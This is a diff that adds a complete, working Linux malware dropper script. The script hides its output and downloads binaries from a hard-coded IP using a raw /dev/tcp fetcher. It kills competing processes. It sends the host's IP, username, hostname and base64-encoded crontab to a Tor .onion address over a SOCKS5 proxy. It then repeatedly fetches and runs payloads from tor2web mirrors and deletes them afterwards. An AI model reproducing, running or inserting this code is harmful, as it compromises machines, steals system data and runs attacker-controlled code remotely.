@@ -1,0 +1,64 @@
+XRANDOM
+exec &>/dev/null
+export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+
+function kurl() {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+
+rm -f $HOME/ss
+curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.82.0/curl-amd64 -O $HOME/curl;chmod +x $HOME/curl
+curl -V || kurl http://139.59.150.7:443/curl > $HOME/curl;chmod +x $HOME/curl
+ss -v   || kurl http://139.59.150.7:443/ss   > $HOME/ss;chmod +x $HOME/ss
+ss -v   || curl -s http://139.59.150.7:443/ss -o $HOME/ss;chmod +x $HOME/ss
+ps      || curl -s http://139.59.150.7:443/ps -o $HOME/ps;chmod +x $HOME/ps
+ps aux| grep "postgres: grep"| grep -v grep | awk '{print $2}' | xargs kill -9
+
+d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
+c=$(echo "curl -4fsSLkA- -m200")
+t=$(echo "rxmxpzfkydkulhhqnuftbmf6d5q67jjchopmh4ofszfwwnmz4bqq2fid")
+
+sockz() {
+n=(dns.twnic.tw doh-ch.blahdns.com doh-de.blahdns.com doh-fi.blahdns.com doh-jp.blahdns.com doh.li doh.pub doh-sg.blahdns.com fi.doh.dns.snopyta.org hydra.plan9-ns1.com)
+p=$(echo "dns-query?name=relay.tor2socks.in")
+q=${n[$((RANDOM%${#n[@]}))]}
+s=$($c https://$q/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|grep -Ev [.]0|sort -uR|tail -1)
+}
+
+fexe() {
+for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done
+}
+
+u() {
+sockz
+f=/dd.$(uname -m)
+x=./$(date|md5sum|cut -f1 -d-)
+r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0)
+$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r
+chmod +x $x;$x;rm -f $x
+}
+
+for h in tor2web.in tor2web.it
+do
+if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then
+fexe;u $t.$h
+ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)
+ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)
+else
+break
+fi
+done
+$c http://$t.tor2web.in/a -o ./a;chmod +x a;./a
+$c http://$t.tor2web.in/b -o ./b;chmod +x b;./b
+$c http://$t.tor2web.in/c -o ./c;chmod +x c;./c
